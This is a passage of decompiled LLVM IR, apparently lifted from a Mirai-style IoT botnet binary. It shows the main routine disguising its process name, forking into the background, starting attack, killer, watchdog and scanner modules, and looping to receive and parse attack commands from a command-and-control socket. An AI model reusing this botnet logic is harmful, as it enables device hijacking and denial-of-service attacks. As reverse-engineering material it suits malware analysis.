  store i32 %v2_da50, i32* @r5, align 4
  %v2_da54 = add i32 %v3_da48, %v2_da38
  store i32 %v2_da54, i32* @r4, align 4
  %v2_da60 = call i32 @rand_alpha_str(i32 %v2_da50, i32 %v2_da54)
  %v2_da68 = ptrtoint i32* %stack_var_-40 to i32
  %v1_da6c = load i32, i32* @r4, align 4
  %v2_da6c = add i32 %v1_da6c, %v2_da68
  store i32 %v2_da6c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  %v0_da78 = load i32, i32* @r8, align 4
  %v1_da78 = inttoptr i32 %v0_da78 to i32*
  %v2_da78 = load i32, i32* %v1_da78, align 4
  store i32 %v2_da78, i32* @r0, align 4
  %v3_da7c = add i32 %v2_da6c, -64
  %v4_da7c = inttoptr i32 %v3_da7c to i8*
  store i8 0, i8* %v4_da7c, align 1
  %v2_da80 = inttoptr i32 %v2_da78 to i8*
  %v3_da80 = call i32 @util_strcpy(i8* %v2_da80, i32 %v2_da50)
  store i32 32, i32* @r1, align 4
  store i32 %v2_da50, i32* @r0, align 4
  %v0_da8c = call i32 @util_zero()
  %v0_da90 = call i32 @rand_next()
  store i32 %v0_da90, i32* @r7, align 4
  %v0_da98 = load i32, i32* @r8, align 4
  %v1_da98 = inttoptr i32 %v0_da98 to i32*
  %v2_da98 = load i32, i32* %v1_da98, align 4
  %v1_da9c = inttoptr i32 %v2_da98 to i8*
  %v2_da9c = call i32 @util_strlen(i8* %v1_da9c)
  store i32 %v2_da9c, i32* @r6, align 4
  %v0_daa4 = load i32, i32* @r8, align 4
  %v1_daa4 = inttoptr i32 %v0_daa4 to i32*
  %v2_daa4 = load i32, i32* %v1_daa4, align 4
  %v1_daa8 = inttoptr i32 %v2_daa4 to i8*
  %v2_daa8 = call i32 @util_strlen(i8* %v1_daa8)
  %v0_daac = load i32, i32* @r6, align 4
  %v1_daac = sub i32 20, %v0_daac
  %v0_dab4 = load i32, i32* @r7, align 4
  %v3_dab8 = urem i32 %v0_dab4, %v1_daac
  %v2_dabc = add i32 %v3_dab8, %v2_daa8
  store i32 %v2_dabc, i32* @r4, align 4
  %v2_dac8 = call i32 @rand_alpha_str(i32 %v2_da50, i32 %v2_dabc)
  store i32 %v2_da68, i32* %r2.global-to-local, align 4
  %v1_dad4 = load i32, i32* @r4, align 4
  %v2_dad4 = add i32 %v1_dad4, %v2_da68
  store i32 %v2_dad4, i32* %r3.global-to-local, align 4
  %v0_dad8 = load i32, i32* @sb, align 4
  %v1_dad8 = trunc i32 %v0_dad8 to i8
  %v3_dad8 = add i32 %v2_dad4, -64
  %v4_dad8 = inttoptr i32 %v3_dad8 to i8*
  store i8 %v1_dad8, i8* %v4_dad8, align 1
  %v4_dae4 = call i32 @prctl(i32 15, i32 %v2_da50, i32 %v2_da68, i32 %v2_dad4)
  %v1_daec = call i32 @table_unlock_val(i32 3)
  %v3_daf8 = call i32 @table_retrieve_val(i32 3, i32* nonnull %stack_var_-48)
  %v3_dafc = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_dafc, i32* @r2, align 4
  %v2_db08 = call i32 @__GI___libc_write(i32 1, i32 %v3_daf8)
  store i32 1, i32* @r2, align 4
  %v2_db18 = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_18fdc.102 to i32))
  %v1_db20 = call i32 @table_lock_val(i32 3)
  %v1_db24 = call i32 @attack_init(i32 %v1_db20)
  %v1_db28 = call i32 @killer_init(i32 %v1_db24)
  %v1_db2c = inttoptr i32 %v1_db28 to i16*
  %v2_db2c = call i32 @watchdog_maintain(i16* %v1_db2c)
  %v0_db30 = call i32 @__libc_fork()
  %v1_db34 = load i32, i32* @sb, align 4
  %v7_db38 = icmp sgt i32 %v0_db30, %v1_db34
  br i1 %v7_db38, label %dec_label_pc_db3c, label %dec_label_pc_db8c

dec_label_pc_db3c:                                ; preds = %dec_label_pc_da20
  ret i32 %v1_db34

dec_label_pc_db50:                                ; preds = %entry
  %v0_db50 = load i32, i32* @r8, align 4
  %v1_db50 = add i32 %v0_db50, 4
  %v2_db50 = inttoptr i32 %v1_db50 to i32*
  %v3_db50 = load i32, i32* %v2_db50, align 4
  %v1_db54 = inttoptr i32 %v3_db50 to i8*
  %v2_db54 = call i32 @util_strlen(i8* %v1_db54)
  %v8_db5c = icmp sgt i32 %v2_db54, 31
  br i1 %v8_db5c, label %dec_label_pc_da20, label %dec_label_pc_db60

dec_label_pc_db60:                                ; preds = %dec_label_pc_db50
  %v0_db64 = load i32, i32* @r8, align 4
  %v1_db64 = add i32 %v0_db64, 4
  %v2_db64 = inttoptr i32 %v1_db64 to i32*
  %v3_db64 = load i32, i32* %v2_db64, align 4
  store i32 %v2_da0c, i32* @r0, align 4
  %v2_db6c = bitcast i32* %stack_var_-136 to i8*
  %v3_db6c = call i32 @util_strcpy(i8* %v2_db6c, i32 %v3_db64)
  %v0_db70 = load i32, i32* @r8, align 4
  %v1_db70 = add i32 %v0_db70, 4
  %v2_db70 = inttoptr i32 %v1_db70 to i32*
  %v3_db70 = load i32, i32* %v2_db70, align 4
  %v1_db78 = inttoptr i32 %v3_db70 to i8*
  %v2_db78 = call i32 @util_strlen(i8* %v1_db78)
  store i32 %v2_db78, i32* @r1, align 4
  store i32 %v3_db70, i32* @r0, align 4
  %v0_db84 = call i32 @util_zero()
  br label %dec_label_pc_da20

dec_label_pc_db8c:                                ; preds = %dec_label_pc_da20
  %v1_db8c = call i32 @__GI_setsid(i32 %v0_db30)
  %v0_db90 = load i32, i32* @sb, align 4
  %v1_db94 = call i32 @__GI___libc_close(i32 %v0_db90)
  %v1_db9c = call i32 @__GI___libc_close(i32 1)
  %v1_dba4 = call i32 @__GI___libc_close(i32 2)
  %v1_dba8 = call i32 @attack_init(i32 %v1_dba4)
  %v1_dbac = call i32 @killer_init(i32 %v1_dba8)
  %v1_dbb0 = inttoptr i32 %v1_dbac to i16*
  %v2_dbb0 = call i32 @watchdog_maintain(i16* %v1_dbb0)
  %v1_dbb4 = call i32 @scanner_init(i32 %v2_dbb0)
  store i32 ptrtoint (i32* @global_var_2173c.83 to i32), i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_21740.105 to i32), i32* @sl, align 4
  %v2_dbc8 = ptrtoint i32* %stack_var_-264 to i32
  store i32 %v2_dbc8, i32* @r6, align 4
  %v2_dbcc = ptrtoint i32* %stack_var_-392 to i32
  store i32 %v2_dbcc, i32* @r7, align 4
  %v2_dcac = ptrtoint i32* %stack_var_-72 to i32
  %v2_dcf4 = ptrtoint i32* %stack_var_-144 to i32
  %v2_dfbc = ptrtoint i8** %stack_var_-42 to i32
  %v2_de54 = ptrtoint i32* %stack_var_-1416 to i32
  %v2_df4c = ptrtoint i32* %stack_var_-52 to i32
  %v2_df50 = ptrtoint i32* %stack_var_-56 to i32
  %v1_e00c = bitcast i32* %stack_var_-136 to i8*
  br label %dec_label_pc_dbd0

dec_label_pc_dbd0:                                ; preds = %dec_label_pc_dfd0, %dec_label_pc_e004, %bb45, %dec_label_pc_de6c, %dec_label_pc_ddb0, %dec_label_pc_dda0, %bb42, %dec_label_pc_e08c, %dec_label_pc_e070, %dec_label_pc_e058, %dec_label_pc_dfe0, %dec_label_pc_df78, %dec_label_pc_dec4, %dec_label_pc_dd54, %dec_label_pc_db8c
  store i32 0, i32* %stack_var_-264, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dbdc

dec_label_pc_dbdc:                                ; preds = %dec_label_pc_dbdc, %dec_label_pc_dbd0
  %v1_dbe0 = phi i32 [ %v1_dbe4, %dec_label_pc_dbdc ], [ 4, %dec_label_pc_dbd0 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_dbe0 = load i32, i32* @r6, align 4
  %v3_dbe0 = add i32 %v2_dbe0, %v1_dbe0
  %v4_dbe0 = inttoptr i32 %v3_dbe0 to i32*
  store i32 0, i32* %v4_dbe0, align 4
  %v0_dbe4 = load i32, i32* %r3.global-to-local, align 4
  %v1_dbe4 = add i32 %v0_dbe4, 4
  store i32 %v1_dbe4, i32* %r3.global-to-local, align 4
  %v7_dbe8 = icmp eq i32 %v1_dbe4, 128
  br i1 %v7_dbe8, label %dec_label_pc_dbf0, label %dec_label_pc_dbdc

dec_label_pc_dbf0:                                ; preds = %dec_label_pc_dbdc
  %v0_dbf0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_dbf0, i32* %stack_var_-392, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dbf8

dec_label_pc_dbf8:                                ; preds = %dec_label_pc_dbf8, %dec_label_pc_dbf0
  %v1_dbfc = phi i32 [ %v1_dc00, %dec_label_pc_dbf8 ], [ 4, %dec_label_pc_dbf0 ]
  store i32 0, i32* @r4, align 4
  %v2_dbfc = load i32, i32* @r7, align 4
  %v3_dbfc = add i32 %v2_dbfc, %v1_dbfc
  %v4_dbfc = inttoptr i32 %v3_dbfc to i32*
  store i32 0, i32* %v4_dbfc, align 4
  %v0_dc00 = load i32, i32* %r3.global-to-local, align 4
  %v1_dc00 = add i32 %v0_dc00, 4
  store i32 %v1_dc00, i32* %r3.global-to-local, align 4
  %v7_dc04 = icmp eq i32 %v1_dc00, 128
  br i1 %v7_dc04, label %dec_label_pc_dc0c, label %dec_label_pc_dbf8

dec_label_pc_dc0c:                                ; preds = %dec_label_pc_dbf8
  %v2_dc0c = load i32, i32* @global_var_2173c.83, align 4
  %v7_dc10 = icmp eq i32 %v2_dc0c, -1
  br i1 %v7_dc10, label %dec_label_pc_dc40, label %dec_label_pc_dc18

dec_label_pc_dc18:                                ; preds = %dec_label_pc_dc0c
  %v3_dc18 = udiv i32 %v2_dc0c, 32
  %v3_dc20 = mul nuw nsw i32 %v3_dc18, 4
  store i32 %v2_da68, i32* %ip.global-to-local, align 4
  %v2_dc28 = add i32 %v3_dc20, %v2_da68
  store i32 %v2_dc28, i32* %r3.global-to-local, align 4
  %v1_dc2c = add i32 %v2_dc28, -224
  %v2_dc2c = inttoptr i32 %v1_dc2c to i32*
  %v3_dc2c = load i32, i32* %v2_dc2c, align 4
  %v1_dc30 = urem i32 %v2_dc0c, 32
  %v7_dc38 = shl i32 1, %v1_dc30
  %v8_dc38 = or i32 %v3_dc2c, %v7_dc38
  store i32 %v8_dc38, i32* %r2.global-to-local, align 4
  store i32 %v8_dc38, i32* %v2_dc2c, align 4
  br label %dec_label_pc_dc40

dec_label_pc_dc40:                                ; preds = %dec_label_pc_dc0c, %dec_label_pc_dc18
  %v2_dc40 = load i32, i32* @global_var_21740.105, align 4
  store i32 %v2_dc40, i32* @r3, align 4
  %v7_dc44 = icmp eq i32 %v2_dc40, -1
  store i32 ptrtoint (i32* @global_var_21740.105 to i32), i32* @r8, align 4
  br i1 %v7_dc44, label %dec_label_pc_ded0, label %dec_label_pc_dc50

dec_label_pc_dc50:                                ; preds = %dec_label_pc_ded0, %dec_label_pc_dc40, %bb44
  %v2_dc54 = load i8, i8* bitcast (i8** @global_var_218c0.107 to i8*), align 4
  %v3_dc54 = zext i8 %v2_dc54 to i32
  store i32 %v3_dc54, i32* %r3.global-to-local, align 4
  %v2_dc58 = icmp eq i8 %v2_dc54, 0
  %v2_dd70 = load i32, i32* @global_var_21740.105, align 4
  store i32 %v2_dd70, i32* %ip.global-to-local, align 4
  %v3_dd78 = udiv i32 %v2_dd70, 32
  br i1 %v2_dc58, label %dec_label_pc_dd70, label %dec_label_pc_dc60

dec_label_pc_dc60:                                ; preds = %dec_label_pc_dc50
  %v3_dc70 = mul nuw nsw i32 %v3_dd78, 4
  %v2_dc74 = add i32 %v3_dc70, %v2_da68
  store i32 %v2_dc74, i32* %r3.global-to-local, align 4
  %v1_dc78 = add i32 %v2_dc74, -352
  %v2_dc78 = inttoptr i32 %v1_dc78 to i32*
  %v3_dc78 = load i32, i32* %v2_dc78, align 4
  %v1_dc7c = urem i32 %v2_dd70, 32
  %v7_dc84 = shl i32 1, %v1_dc7c
  %v8_dc84 = or i32 %v3_dc78, %v7_dc84
  store i32 %v8_dc84, i32* %r2.global-to-local, align 4
  store i32 %v8_dc84, i32* %v2_dc78, align 4
  br label %dec_label_pc_dc8c

dec_label_pc_dc8c:                                ; preds = %dec_label_pc_dd70, %dec_label_pc_dc60
  %v2_dc8c = load i32, i32* @global_var_2173c.83, align 4
  %v0_dc90 = load i32, i32* %ip.global-to-local, align 4
  %v5_dc94 = icmp slt i32 %v0_dc90, %v2_dc8c
  br i1 %v5_dc94, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_dc8c
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_dc8c, %bb
  %v0_dcb0 = phi i32 [ %v2_dc8c, %dec_label_pc_dc8c ], [ %v0_dc90, %bb ]
  store i32 0, i32* @lr, align 4
  store i32 10, i32* %stack_var_-72, align 4
  store i32 %v2_dcac, i32* %ip.global-to-local, align 4
  %v1_dcb0 = add i32 %v0_dcb0, 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_dbcc, i32* %r2.global-to-local, align 4
  %v5_dcc8 = call i32 @__libc_select(i32 %v1_dcb0, i32 %v2_dbc8, i32 %v2_dbcc, i32 0, i32 %v2_dcac)
  %v8_dccc = icmp eq i32 %v5_dcc8, -1
  br i1 %v8_dccc, label %dec_label_pc_dbd0, label %dec_label_pc_dcd4

dec_label_pc_dcd4:                                ; preds = %bb42
  %v6_dcc8 = trunc i32 %v5_dcc8 to i16
  %v3_dcd4 = icmp eq i16 %v6_dcc8, 0
  br i1 %v3_dcd4, label %dec_label_pc_dcdc, label %dec_label_pc_dd08

dec_label_pc_dcdc:                                ; preds = %dec_label_pc_dcd4
  %v2_dce0 = load i32, i32* @sb, align 4
  %v5_dce4 = srem i32 %v2_dce0, 6
  %v4_dcec = sub i32 %v2_dce0, %v5_dce4
  store i32 %v4_dcec, i32* %r3.global-to-local, align 4
  store i32 %v5_dce4, i32* %r2.global-to-local, align 4
  %v2_dcf8 = icmp eq i32 %v5_dce4, 0
  %v7_dcfc = inttoptr i32 %v5_dcc8 to i8*
  store i8* %v7_dcfc, i8** %stack_var_-42, align 4
  %v1_dd00 = add i32 %v2_dce0, 1
  store i32 %v1_dd00, i32* @sb, align 4
  br i1 %v2_dcf8, label %dec_label_pc_dfb4, label %dec_label_pc_dd08

dec_label_pc_dd08:                                ; preds = %dec_label_pc_dcd4, %dec_label_pc_dcdc, %dec_label_pc_dfb4
  store i32 ptrtoint (i8** @global_var_218c0.107 to i32), i32* %r2.global-to-local, align 4
  %v2_dd0c = load i8, i8* bitcast (i8** @global_var_218c0.107 to i8*), align 4
  %v3_dd0c = zext i8 %v2_dd0c to i32
  store i32 %v3_dd0c, i32* @r4, align 4
  %v2_dd10 = icmp eq i8 %v2_dd0c, 0
  %v2_dda0 = load i32, i32* @global_var_21740.105, align 4
  br i1 %v2_dd10, label %dec_label_pc_dda0, label %dec_label_pc_dd18

dec_label_pc_dd18:                                ; preds = %dec_label_pc_dd08
  %v3_dd20 = udiv i32 %v2_dda0, 32
  store i32 %v2_da68, i32* %ip.global-to-local, align 4
  %v3_dd28 = mul nuw nsw i32 %v3_dd20, 4
  %v2_dd2c = add i32 %v3_dd28, %v2_da68
  store i32 %v2_dd2c, i32* %r3.global-to-local, align 4
  %v1_dd30 = add i32 %v2_dd2c, -352
  %v2_dd30 = inttoptr i32 %v1_dd30 to i32*
  %v3_dd30 = load i32, i32* %v2_dd30, align 4
  %v1_dd34 = urem i32 %v2_dda0, 32
  %v6_dd38 = ashr i32 %v3_dd30, %v1_dd34
  store i32 %v6_dd38, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_218c0.107 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_dd44 = urem i32 %v6_dd38, 2
  %v2_dd44 = icmp eq i32 %v1_dd44, 0
  store i8 0, i8* bitcast (i8** @global_var_218c0.107 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_21740.105 to i32), i32* @r4, align 4
  br i1 %v2_dd44, label %dec_label_pc_dd54, label %dec_label_pc_df40

dec_label_pc_dd54:                                ; preds = %dec_label_pc_dd18
  store i32 56668, i32* @lr, align 4
  %v1_dd58 = icmp ne i32 %v2_dda0, -1
  call void @__pseudo_cond_branch(i1 %v1_dd58, i32 ptrtoint (i32* @global_var_13fb0.109 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dd60 = load i32, i32* @r4, align 4
  %v2_dd60 = inttoptr i32 %v1_dd60 to i32*
  store i32 -1, i32* %v2_dd60, align 4
  %v1_dd68 = call i32 @sleep(i32 1)
  br label %dec_label_pc_dbd0

dec_label_pc_dd70:                                ; preds = %dec_label_pc_dc50
  store i32 %v2_da68, i32* %r2.global-to-local, align 4
  %v3_dd80 = mul nuw nsw i32 %v3_dd78, 4
  %v2_dd84 = add i32 %v3_dd80, %v2_da68
  store i32 %v2_dd84, i32* %r3.global-to-local, align 4
  %v1_dd88 = add i32 %v2_dd84, -224
  %v2_dd88 = inttoptr i32 %v1_dd88 to i32*
  %v3_dd88 = load i32, i32* %v2_dd88, align 4
  %v1_dd8c = urem i32 %v2_dd70, 32
  %v7_dd94 = shl i32 1, %v1_dd8c
  %v8_dd94 = or i32 %v3_dd88, %v7_dd94
  store i32 %v8_dd94, i32* %r2.global-to-local, align 4
  store i32 %v8_dd94, i32* %v2_dd88, align 4
  br label %dec_label_pc_dc8c

dec_label_pc_dda0:                                ; preds = %dec_label_pc_dd08
  %v7_dda4 = icmp eq i32 %v2_dda0, -1
  store i32 ptrtoint (i32* @global_var_21740.105 to i32), i32* @r8, align 4
  br i1 %v7_dda4, label %dec_label_pc_dbd0, label %dec_label_pc_ddb0

dec_label_pc_ddb0:                                ; preds = %dec_label_pc_dda0
  %v3_ddb0 = udiv i32 %v2_dda0, 32
  %v3_ddb8 = mul nuw nsw i32 %v3_ddb0, 4
  store i32 %v2_da68, i32* %ip.global-to-local, align 4
  %v2_ddc0 = add i32 %v3_ddb8, %v2_da68
  store i32 %v2_ddc0, i32* %r3.global-to-local, align 4
  %v1_ddc4 = add i32 %v2_ddc0, -224
  %v2_ddc4 = inttoptr i32 %v1_ddc4 to i32*
  %v3_ddc4 = load i32, i32* %v2_ddc4, align 4
  %v1_ddc8 = urem i32 %v2_dda0, 32
  %v6_ddcc = ashr i32 %v3_ddc4, %v1_ddc8
  store i32 %v6_ddcc, i32* %r2.global-to-local, align 4
  %v1_ddd0 = urem i32 %v6_ddcc, 2
  %v2_ddd0 = icmp eq i32 %v1_ddd0, 0
  br i1 %v2_ddd0, label %dec_label_pc_dbd0, label %dec_label_pc_ddd8

dec_label_pc_ddd8:                                ; preds = %dec_label_pc_ddb0
  store i32 %v2_dcf4, i32* @lr, align 4
  %v6_dddc = inttoptr i32 %v3_dd0c to i8*
  store i8* %v6_dddc, i8** %stack_var_-42, align 4
  %v0_dde0 = call i32 @__GI___errno_location()
  %v0_dde4 = load i32, i32* @r4, align 4
  %v2_dde4 = inttoptr i32 %v0_dde0 to i32*
  store i32 %v0_dde4, i32* %v2_dde4, align 4
  store i32 %v0_dde0, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_ddf8 = load i32, i32* @global_var_21740.105, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_de04 = call i32 @__libc_recv(i32 %v2_ddf8, i32 %v2_dfbc, i32 2, i32 16386)
  %v7_de08 = icmp eq i32 %v4_de04, -1
  br i1 %v7_de08, label %dec_label_pc_dfd0, label %dec_label_pc_de10

dec_label_pc_de10:                                ; preds = %dec_label_pc_ddd8
  %v2_de10 = icmp eq i32 %v4_de04, 0
  br i1 %v2_de10, label %dec_label_pc_dfe0, label %dec_label_pc_de18

dec_label_pc_de18:                                ; preds = %dec_label_pc_de10
  store i32 %v2_dcf4, i32* @r1, align 4
  %v3_de1c = load i8*, i8** %stack_var_-42, align 4
  %v4_de1c = ptrtoint i8* %v3_de1c to i32
  store i32 %v4_de1c, i32* %r3.global-to-local, align 4
  %v2_de20 = icmp eq i8* %v3_de1c, null
  br i1 %v2_de20, label %dec_label_pc_e070, label %dec_label_pc_de28

dec_label_pc_de28:                                ; preds = %dec_label_pc_de18
  %v3_de28 = udiv i32 %v4_de1c, 256
  %v1_de2c = mul i32 %v4_de1c, 256
  %v4_de30 = and i32 %v1_de2c, 65280
  %v5_de30 = or i32 %v4_de30, %v3_de28
  %v6_de30 = trunc i32 %v5_de30 to i16
  store i32 %v5_de30, i32* %r2.global-to-local, align 4
  store i32 %v2_dcf4, i32* %r3.global-to-local, align 4
  %v7_de3c = inttoptr i32 %v5_de30 to i8*
  store i8* %v7_de3c, i8** %stack_var_-42, align 4
  %tmp46 = icmp ugt i16 %v6_de30, 1024
  br i1 %tmp46, label %dec_label_pc_e08c, label %dec_label_pc_de44

dec_label_pc_de44:                                ; preds = %dec_label_pc_de28
  %v0_de44 = load i32, i32* @r4, align 4
  %v1_de44 = load i32, i32* @r5, align 4
  %v2_de44 = inttoptr i32 %v1_de44 to i32*
  store i32 %v0_de44, i32* %v2_de44, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_de50 = load i32, i32* @global_var_21740.105, align 4
  %v7_de58 = call i32 @__libc_recv(i32 %v2_de50, i32 %v2_de54, i32 %v5_de30, i32 16386)
  %v7_de5c = icmp eq i32 %v7_de58, -1
  br i1 %v7_de5c, label %dec_label_pc_dfd0, label %dec_label_pc_de64

dec_label_pc_de64:                                ; preds = %dec_label_pc_de44
  %v2_de64 = icmp eq i32 %v7_de58, 0
  br i1 %v2_de64, label %dec_label_pc_dfe0, label %dec_label_pc_de6c

dec_label_pc_de6c:                                ; preds = %dec_label_pc_de64
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_de7c = load i32, i32* @global_var_21740.105, align 4
  %v4_de80 = call i32 @__libc_recv(i32 %v2_de7c, i32 %v2_dfbc, i32 2, i32 16384)
  %v3_de88 = load i8*, i8** %stack_var_-42, align 4
  %v4_de88 = ptrtoint i8* %v3_de88 to i32
  %v3_de8c = udiv i32 %v4_de88, 256
  %v1_de90 = mul i32 %v4_de88, 256
  %v4_de94 = and i32 %v1_de90, 65280
  %v5_de94 = or i32 %v4_de94, %v3_de8c
  store i32 %v5_de94, i32* %ip.global-to-local, align 4
  store i32 %v2_dcf4, i32* @lr, align 4
  store i32 %v5_de94, i32* %r2.global-to-local, align 4
  %v2_dea4 = load i32, i32* @global_var_21740.105, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_deac = inttoptr i32 %v5_de94 to i8*
  store i8* %v6_deac, i8** %stack_var_-42, align 4
  %v6_deb0 = call i32 @__libc_recv(i32 %v2_dea4, i32 %v2_de54, i32 %v5_de94, i32 16384)
  store i32 %v2_dcf4, i32* %r2.global-to-local, align 4
  %v3_deb8 = load i8*, i8** %stack_var_-42, align 4
  %v3_debc = icmp eq i8* %v3_deb8, null
  br i1 %v3_debc, label %dec_label_pc_dbd0, label %dec_label_pc_dec4

dec_label_pc_dec4:                                ; preds = %dec_label_pc_de6c
  %v4_deb8 = ptrtoint i8* %v3_deb8 to i32
  %v5_dec8 = call i32 @attack_parse(i32* nonnull %stack_var_-1416, i32 %v4_deb8, i32 %v2_dcf4)
  br label %dec_label_pc_dbd0

dec_label_pc_ded0:                                ; preds = %dec_label_pc_dc40
  %v0_ded8 = load i32, i32* @r4, align 4
  store i32 %v0_ded8, i32* %r2.global-to-local, align 4
  %v3_dedc = call i32 @socket(i32 2, i32 1, i32 %v0_ded8)
  %v7_dee0 = icmp eq i32 %v3_dedc, -1
  store i32 %v3_dedc, i32* @r5, align 4
  %v1_dee8 = load i32, i32* @r8, align 4
  %v2_dee8 = inttoptr i32 %v1_dee8 to i32*
  store i32 %v3_dedc, i32* %v2_dee8, align 4
  br i1 %v7_dee0, label %dec_label_pc_dc50, label %dec_label_pc_def0

dec_label_pc_def0:                                ; preds = %dec_label_pc_ded0
  %v0_def0 = load i32, i32* @r4, align 4
  store i32 %v0_def0, i32* @r2, align 4
  %v2_def8 = call i32 @__libc_fcntl(i32 %v3_dedc, i32 3)
  %v1_df00 = or i32 %v2_def8, 2048
  store i32 %v1_df00, i32* @r2, align 4
  %v0_df04 = load i32, i32* @r5, align 4
  %v2_df08 = call i32 @__libc_fcntl(i32 %v0_df04, i32 4)
  %v2_df10 = load i32, i32* @global_var_21744.81, align 4
  store i32 %v2_df10, i32* %r3.global-to-local, align 4
  %v2_df14 = icmp eq i32 %v2_df10, 0
  br i1 %v2_df14, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_def0
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_def0, %bb43
  %v2_df1c = xor i1 %v2_df14, true
  call void @__pseudo_cond_branch(i1 %v2_df1c, i32 ptrtoint (i32* @global_var_1041c.110 to i32))
  store i32 ptrtoint (i8** @global_var_218c0.107 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_df28 = load i32, i32* @global_var_21740.105, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_218c0.107 to i8*), align 4
  %v4_df38 = call i32 @__libc_connect(i32 %v2_df28, i32 ptrtoint (i16** @global_var_243dc.90 to i32), i32 16)
  br label %dec_label_pc_dc50

dec_label_pc_df40:                                ; preds = %dec_label_pc_dd18
  store i32 4, i32* @r5, align 4
  store i32 %v2_df4c, i32* %r3.global-to-local, align 4
  store i32 %v2_df50, i32* @lr, align 4
  store i32 1, i32* @r1, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_df68 = call i32 @getsockopt(i32 %v2_dda0, i32 1, i32 4, i32 %v2_df4c, i32 %v2_df50)
  %v3_df6c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_df6c, i32* %r3.global-to-local, align 4
  %v2_df70 = icmp eq i32 %v3_df6c, 0
  br i1 %v2_df70, label %dec_label_pc_e004, label %dec_label_pc_df78

dec_label_pc_df78:                                ; preds = %dec_label_pc_df40
  %v2_df78 = load i32, i32* @global_var_21740.105, align 4
  %v1_df7c = call i32 @__GI___libc_close(i32 %v2_df78)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_df84 = load i32, i32* @r4, align 4
  %v2_df84 = inttoptr i32 %v1_df84 to i32*
  store i32 -1, i32* %v2_df84, align 4
  %v0_df88 = call i32 @rand_next()
  %v3_df90 = zext i32 %v0_df88 to i64
  %v4_df90 = mul nuw i64 %v3_df90, 3435973837
  %v3_df942 = udiv i64 %v4_df90, 34359738368
  %v3_df984 = mul nuw nsw i64 %v3_df942, 8
  %v3_df98 = trunc i64 %v3_df984 to i32
  store i32 %v3_df98, i32* %r2.global-to-local, align 4
  %v2_df9c6 = mul nuw nsw i64 %v3_df942, 2
  %v2_df9c = trunc i64 %v2_df9c6 to i32
  %v2_dfa0 = add i32 %v3_df98, %v2_df9c
  store i32 %v2_dfa0, i32* %r3.global-to-local, align 4
  %v2_dfa4 = sub i32 %v0_df88, %v2_dfa0
  %v1_dfa8 = add i32 %v2_dfa4, 1
  %v1_dfac = call i32 @sleep(i32 %v1_dfa8)
  br label %dec_label_pc_dbd0

dec_label_pc_dfb4:                                ; preds = %dec_label_pc_dcdc
  %v2_dfb8 = load i32, i32* @global_var_21740.105, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_dfc8 = call i32 @__libc_send(i32 %v2_dfb8, i32 %v2_dfbc, i32 2, i32 16384)
  br label %dec_label_pc_dd08

dec_label_pc_dfd0:                                ; preds = %dec_label_pc_de44, %dec_label_pc_ddd8
  %v0_dfd0 = load i32, i32* @r5, align 4
  %v1_dfd0 = inttoptr i32 %v0_dfd0 to i32*
  %v2_dfd0 = load i32, i32* %v1_dfd0, align 4
  store i32 %v2_dfd0, i32* %r3.global-to-local, align 4
  %v7_dfd4 = icmp eq i32 %v2_dfd0, 4
  br i1 %v7_dfd4, label %dec_label_pc_dbd0, label %bb45

bb45:                                             ; preds = %dec_label_pc_dfd0
  %v8_dfd8 = icmp eq i32 %v2_dfd0, 11
  br i1 %v8_dfd8, label %dec_label_pc_dbd0, label %dec_label_pc_dfe0

dec_label_pc_dfe0:                                ; preds = %bb45, %dec_label_pc_de64, %dec_label_pc_de10
  %v2_dfe0 = load i32, i32* @global_var_21740.105, align 4
  store i32 57324, i32* @lr, align 4
  %v1_dfe8 = icmp ne i32 %v2_dfe0, -1
  call void @__pseudo_cond_branch(i1 %v1_dfe8, i32 ptrtoint (i32* @global_var_13fb0.109 to i32))
  store i32 ptrtoint (i32* @global_var_21740.105 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_21740.105, align 4
  %v1_dffc = call i32 @sleep(i32 1)
  br label %dec_label_pc_dbd0

dec_label_pc_e004:                                ; preds = %dec_label_pc_df40
  %v2_e00c = call i32 @util_strlen(i8* %v1_e00c)
  %sext = mul i32 %v2_e00c, 16777216
  %v1_e010 = sdiv i32 %sext, 16777216
  %v7_e010 = inttoptr i32 %v1_e010 to i8*
  store i8* %v7_e010, i8** %stack_var_-42, align 4
  %v0_e014 = call i32 @util_local_addr()
  store i32 %v0_e014, i32* @global_var_243d0.55, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e028 = load i32, i32* @r5, align 4
  store i32 %v0_e028, i32* %r2.global-to-local, align 4
  %v2_e02c = load i32, i32* @global_var_21740.105, align 4
